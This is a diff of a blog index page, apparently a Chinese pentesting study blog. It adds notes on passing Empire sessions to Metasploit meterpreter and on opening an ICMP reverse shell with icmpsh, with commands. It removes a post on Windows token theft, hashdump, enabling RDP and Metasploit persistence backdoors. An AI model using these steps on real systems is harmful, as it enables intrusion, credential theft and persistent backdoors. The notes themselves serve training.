@@ -64,6 +64,61 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-empire会话传递和代理" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2021/08/24/empire%E4%BC%9A%E8%AF%9D%E4%BC%A0%E9%80%92%E5%92%8C%E4%BB%A3%E7%90%86/" class="article-date">
+  <time datetime="2021-08-24T04:23:30.000Z" itemprop="datePublished">2021-08-24</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2021/08/24/empire%E4%BC%9A%E8%AF%9D%E4%BC%A0%E9%80%92%E5%92%8C%E4%BB%A3%E7%90%86/">empire会话传递和代理</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="empire会话传递"><a href="#empire会话传递" class="headerlink" title="empire会话传递"></a>empire会话传递</h2><ol>
+<li>获取session(特权用户传递会继承到特权)</li>
+<li>进入msf模块: <code>exploit/multi/script/web_delivery </code> –&gt; target: PSH –&gt; paylaod: windows/meterpreter/reverse_tcp –&gt; 监听</li>
+<li>使用模块: <code>code_execution/invoke_metasploitpayload</code> –&gt; 设置Agent, URL(根据msf生成的url去设置)</li>
+<li>执行传递</li>
+</ol>
+<h2 id="端口转发和代理"><a href="#端口转发和代理" class="headerlink" title="端口转发和代理"></a>端口转发和代理</h2><p>Windows: <code>mstsc</code></p>
+<p>linux: <code>rdesktop</code></p>
+<h4 id="ICMP"><a href="#ICMP" class="headerlink" title="ICMP"></a>ICMP</h4><h5 id="ICMPSH"><a href="#ICMPSH" class="headerlink" title="ICMPSH"></a>ICMPSH</h5><p><code>需要在同网段下去做, 如果端口受到限制, 那我们就可以用ICMPSH这款工具去反弹shell</code></p>
+<p><code>前提: ping未被禁用</code></p>
+<p>依赖环境: python-impacket(python2版本的) <code>pip2 install impacket</code></p>
+<p>icmsh_m.py 源IP 目标IP</p>
+<p>icmpsh.exe:</p>
+<p>-t target –&gt; 源IP</p>
+<p>-d delay <code>500</code> –&gt; 延迟的毫秒数</p>
+<p>-s bytes  <code>128</code> –&gt; 缓冲区的大小</p>
+<p>-b max blank <code>30</code> –&gt; 最大的空白数</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1. 现在kali设置ping代替应答</span><br><span class="line">sysctl -w net.ipv4.icmp_echo_ignore_all&#x3D;1 &gt;&#x2F;dev&#x2F;null</span><br><span class="line">2. 开启监听</span><br><span class="line">icmpsh_m.py s_ip d_ip</span><br><span class="line">3. 反弹shell</span><br><span class="line">icmpsh.exe -t s_ip -d 500 -s 128 -b 30</span><br></pre></td></tr></table></figure>
+
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2021/08/24/empire%E4%BC%9A%E8%AF%9D%E4%BC%A0%E9%80%92%E5%92%8C%E4%BB%A3%E7%90%86/" data-id="cktx2e69f0009wovj2tukbsm9" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+  
     <article id="post-empire提权和持久化" class="article article-type-post" itemscope itemprop="blogPost">
   <div class="article-meta">
     <a href="/2021/08/21/empire%E6%8F%90%E6%9D%83%E5%92%8C%E6%8C%81%E4%B9%85%E5%8C%96/" class="article-date">
@@ -118,7 +173,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2021/08/21/empire%E6%8F%90%E6%9D%83%E5%92%8C%E6%8C%81%E4%B9%85%E5%8C%96/" data-id="cktqmoghy000cjovj6qjt134o" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2021/08/21/empire%E6%8F%90%E6%9D%83%E5%92%8C%E6%8C%81%E4%B9%85%E5%8C%96/" data-id="cktx2e69k000cwovjdf9df22o" class="article-share-link">Share</a>
       
       
     </footer>
@@ -188,7 +243,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2021/08/18/empire%E5%9F%BA%E6%93%8D/" data-id="cktqmoghx000bjovjcw7fcjyp" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2021/08/18/empire%E5%9F%BA%E6%93%8D/" data-id="cktx2e69i000bwovj0s7j0lz9" class="article-share-link">Share</a>
       
       
     </footer>
@@ -245,7 +300,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2021/08/16/%E5%85%8D%E6%9D%80%E6%94%B6%E5%B0%BE%E5%92%8Cempire/" data-id="cktqmogi4000njovj4y8bfdlv" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2021/08/16/%E5%85%8D%E6%9D%80%E6%94%B6%E5%B0%BE%E5%92%8Cempire/" data-id="cktx2e6a4000owovj8dyzh68c" class="article-share-link">Share</a>
       
       
     </footer>
@@ -311,7 +366,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2021/08/12/%E5%85%8D%E6%9D%802/" data-id="cktqmogi4000mjovjdk1o34zv" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2021/08/12/%E5%85%8D%E6%9D%802/" data-id="cktx2e6a3000nwovjen741llm" class="article-share-link">Share</a>
       
       
     </footer>
@@ -393,7 +448,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2021/08/09/%E5%85%8D%E6%9D%801/" data-id="cktqmogi3000ljovj1gjv91f0" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2021/08/09/%E5%85%8D%E6%9D%801/" data-id="cktx2e6a3000mwovjbkx65zhc" class="article-share-link">Share</a>
       
       
     </footer>
@@ -467,7 +522,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2021/08/06/armitage%E5%92%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" data-id="cktqmoghv0009jovje2vgdxoi" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2021/08/06/armitage%E5%92%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" data-id="cktx2e69h000awovj59cp19ye" class="article-share-link">Share</a>
       
       
     </footer>
@@ -538,7 +593,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2021/08/03/linux%E5%90%8E%E9%97%A8%E6%A4%8D%E5%85%A5/" data-id="cktqmoghz000ejovj8khj7rq4" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2021/08/03/linux%E5%90%8E%E9%97%A8%E6%A4%8D%E5%85%A5/" data-id="cktx2e69l000dwovj5zyrcdg3" class="article-share-link">Share</a>
       
       
     </footer>
@@ -606,7 +661,7 @@ shellcode: 机器码(二进制,十六进制)
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2021/08/01/linux%E6%8F%90%E6%9D%83/" data-id="cktqmogi0000fjovjc6yphtse" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2021/08/01/linux%E6%8F%90%E6%9D%83/" data-id="cktx2e69o000fwovjc4gxfu2q" class="article-share-link">Share</a>
       
       
     </footer>
@@ -677,93 +732,7 @@ shellcode: 机器码(二进制,十六进制)
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2021/07/28/windows%E5%90%8E%E9%97%A8%E6%A4%8D%E5%85%A5%E5%92%8Clinux%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/" data-id="cktqmogi1000hjovjfe90ew3n" class="article-share-link">Share</a>
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-  
-    <article id="post-windows提权" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2021/07/26/windows%E6%8F%90%E6%9D%83/" class="article-date">
-  <time datetime="2021-07-26T03:28:49.000Z" itemprop="datePublished">2021-07-26</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2021/07/26/windows%E6%8F%90%E6%9D%83/">windows提权</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p><strong>uac提权</strong></p>
-<p><strong>bypassuac提权</strong></p>
-<p><strong>windows本地提权</strong></p>
-<p><strong>令牌盗用</strong></p>
-<p>令牌盗用的要求:windows  7之前,及windows 2008之前都可以使用</p>
-<p>use incognito</p>
-<p>list_tokens -u    列出在线的用户名</p>
-<p>假如<code>Impersonation Tokens Available</code>中有system,administrator的用户</p>
-<p>那么就可以用<code>impersonate_token 用户名</code>的方式盗用身份</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">拓展模块的使用:load,use</span><br><span class="line">每次加载了拓展模块,都可以用help查看相对应的帮助信息</span><br></pre></td></tr></table></figure>
-
-<p><strong>windows提权漏洞库:</strong></p>
-<p><a target="_blank" rel="noopener" href="https://github.com/SecWiki/windows-kernel-exploits">https://github.com/SecWiki/windows-kernel-exploits</a></p>
-<p><a target="_blank" rel="noopener" href="https://www.exploit-db.com/">https://www.exploit-db.com/</a>        (msf使用的漏洞库)</p>
-<p><strong>系统服务权限配置错误导致的提权:</strong></p>
-<p>​    exp: <code>exploit/windows/local/service_permissions</code></p>
-<p>aggressive：</p>
-<p>  true ：尽可能多的利用每一个有缺陷的服务<br>            false：第一次提权成功后就会停止工作</p>
-<p><strong>利用AlwaysinstallElevated提权</strong></p>
-<p>打开组策略进行配置：<br>            win + r –&gt; gpedit.msc<br>            计算机配置-&gt;管理模板-&gt;windows组件-&gt;windows installer-&gt;开启：永远以最高权限进<br>            行安装<br>            用户配置-&gt;管理模板-&gt;windows组件-&gt;windows installer-&gt;开启：永远以最高权限进行<br>            安装</p>
-<p>exp: <code>exploit/windows/local/always_install_elevated</code></p>
-<p>windows中的权限: trustedinstaller &gt; system &gt; administrator &gt; normal user</p>
-<p><strong>可信任服务路径提权:</strong></p>
-<p>exp: <code>windows/local/unquoted_service_path</code></p>
-<h2 id="windows后渗透模块"><a href="#windows后渗透模块" class="headerlink" title="windows后渗透模块"></a>windows后渗透模块</h2><p><strong>hashdump报错:</strong> </p>
-<p>​    <code>解决办法--&gt; 进程迁移</code></p>
-<ol>
-<li><p>hashdump</p>
-</li>
-<li><p>run post/windows/gather/smart_hashdump</p>
-</li>
-</ol>
-<p>md5密码破解: <a target="_blank" rel="noopener" href="https://www.cmd5.com/">https://www.cmd5.com/</a></p>
-<p>md5的特点: 生成的密钥无法还原,但是每次一样的内容生成的密钥是相同的</p>
-<p><strong>开启3389端口:</strong></p>
-<p>windows只允许单用户登入,如果其他用户想要登入,必须注销当前用户</p>
-<p>run post/windows/manage/enable_rdp</p>
-<p>开启完后访问3389端口:</p>
-<p>在linux中: rdesktop ip</p>
-<p>在windows中: mstsc </p>
-<h2 id="windows持久化后门"><a href="#windows持久化后门" class="headerlink" title="windows持久化后门"></a>windows持久化后门</h2><p><strong>msf中的持久化后门:</strong></p>
-<p>run persistence</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">-A 自动开启匹配的监听器等待用户连接</span><br><span class="line">-P 指定payload,默认windows&#x2F;meterpreter&#x2F;reverse_tcp</span><br><span class="line">-S 开机的时候以服务的方式去运行后门(system权限)</span><br><span class="line">-T 指定一个模板</span><br><span class="line">-U 用户登入的时候做一个反弹</span><br><span class="line">-X 当系统运行的时候做一个反弹</span><br><span class="line">-i 时间间隔(每隔几秒反弹一次)</span><br><span class="line">-p 指定监听的端口</span><br><span class="line">-r 指定反弹的ip</span><br></pre></td></tr></table></figure>
-
-
-
-
-
-
-
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://yoursite.com/2021/07/26/windows%E6%8F%90%E6%9D%83/" data-id="cktqmogi2000ijovj0yjd6099" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2021/07/28/windows%E5%90%8E%E9%97%A8%E6%A4%8D%E5%85%A5%E5%92%8Clinux%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/" data-id="cktx2e6a0000iwovjbqidfwdr" class="article-share-link">Share</a>
       
       
     </footer>
@@ -809,6 +778,10 @@ shellcode: 机器码(二进制,十六进制)
       <ul>
         
           <li>
+            <a href="/2021/09/23/sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/">sql注入基础</a>
+          </li>
+        
+          <li>
             <a href="/2021/09/19/%E4%BF%A1%E6%81%AF%E8%B5%84%E4%BA%A7%E6%94%B6%E9%9B%86/">信息资产收集</a>
           </li>
         
@@ -822,10 +795,6 @@ shellcode: 机器码(二进制,十六进制)
         
           <li>
             <a href="/2021/09/10/%E7%BD%91%E7%AB%99%E6%95%B0%E6%8D%AE%E5%8C%85%E7%BB%93%E6%9E%84%E5%88%86%E6%9E%90/">网站数据包结构分析</a>
-          </li>
-        
-          <li>
-            <a href="/2021/09/07/WEB%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/">WEB安全基础</a>
           </li>
         
       </ul>
